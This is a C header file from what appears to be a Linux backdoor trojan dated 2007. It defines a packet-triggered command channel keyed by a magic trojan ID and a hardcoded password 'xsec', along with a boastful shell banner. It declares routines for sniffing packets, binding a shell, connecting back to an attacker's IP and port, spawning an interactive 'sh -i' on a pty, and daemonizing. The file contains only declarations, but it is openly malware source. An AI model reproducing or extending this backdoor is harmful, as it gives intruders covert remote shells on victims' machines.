/* 
	recv.h	(c)	2007	wzt 
*/

#ifndef     RECV_H
#define     RECV_H

#define		DEBUG

#define		DATASIZE	     1024
#define 	SEQ 		     12345
#define 	TROJAN_ID        6789
#define		PACKETLEN	     sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct trojan_packet)

#define		MAXCOMMAND	     10
#define		MAXLINE		     20

#define     HOME             "/tmp"
#define     TEMP_FILE        "tthacker"
#define     CREATMODE        0777
#define     TIOCSCTTY        0x540E
#define     TIOCGWINSZ       0x5413
#define     TIOCSWINSZ       0x5414
#define     ECHAR            0x1d
#define     BUF              32768

#define     MAXENV           256
#define     ENVLEN           256

#define     BANNER           "\nconnected successful.welcome to use xsec's shell.have a nice hack!\n\n"
#define     ERRORS           "\nDo you want to get my shell? FUCK------->"

#define 	PASSWD      	 "xsec"    /* deafult password,change it you like */
#define 	PASSERR     	 "passwd error"

#define     LOGIN            "login:"

struct iphdr
{
    unsigned char       h_verlen;
    unsigned char       tos;
    unsigned short      total_len;
    unsigned short      ident;
    unsigned short      frag_and_flags;
    unsigned char       ttl;
    unsigned char       proto;
    unsigned short      checksum;
    unsigned int        sourceIP;
    unsigned int        destIP;
};

struct tcphdr{
    unsigned short      th_sport;
    unsigned short      th_dport;
    unsigned int        th_seq;
    unsigned int        th_ack;
    unsigned char       th_lenres;
    unsigned char       th_flag;
    unsigned short      th_win;
    unsigned short      th_sum;
    unsigned short      th_urp;
};

struct trojan_packet{
    unsigned int        trojan_id;
	unsigned int		datalen;
	char				data[DATASIZE];
};

struct tpacket{
	struct iphdr        ip;
	struct tcphdr       tcp;
	struct trojan_packet trojan;
};

struct winsize {
   unsigned short ws_row;
   unsigned short ws_col;
   unsigned short ws_xpixel;
   unsigned short ws_ypixel;
};

/*
struct sock{
    int sock_fd;
    int sock_id;
};
*/

int sock_fd,sock_id;
	
char *av[]={"sh","-i",NULL};

char command[MAXCOMMAND][MAXLINE];
char *comm[MAXCOMMAND];

char                port[10];
char                ip[20];

void sniff_tcp_packet();
int check_command(char *command);
void abstract_command(char *str);
void exec_command();
void abstract_ip(char *str);
int bindshell(int port);
int connect_back(int ip,int port);
void shell(int sock_id,int sock_fd);
void get_tty(int num, char *base, char *buf);
int open_tty(int *tty, int *pty);
void sig_child(int i);
void hangout(int i);
void my_daemon();

#endif	/* _RECV_H_ */
